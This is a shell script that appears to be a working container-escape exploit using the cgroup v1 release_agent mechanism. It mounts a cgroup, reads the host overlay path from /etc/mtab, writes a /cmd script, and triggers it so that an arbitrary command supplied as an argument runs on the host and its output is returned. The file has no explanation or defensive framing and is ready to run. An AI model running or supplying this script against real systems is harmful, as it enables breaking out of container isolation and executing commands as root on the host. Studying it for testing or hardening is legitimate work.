#!/bin/sh
random_folder=$(date +%s | md5sum | cut -c1-10)
temp_dir="/tmp/cgrp/$random_folder"
cgrp_path="/tmp/cgrp"

mkdir -p "$cgrp_path"

if ! mountpoint -q "$cgrp_path"; then
    mount -t cgroup -o rdma cgroup "$cgrp_path"
else
    echo "Warning: cgroup already mounted at $cgrp_path"
fi

mkdir "$temp_dir"

echo 1 > "$temp_dir/notify_on_release"
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > "/tmp/cgrp/release_agent"

echo '#!/bin/sh' > /cmd
echo "$1 > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > $temp_dir/cgroup.procs"
head /output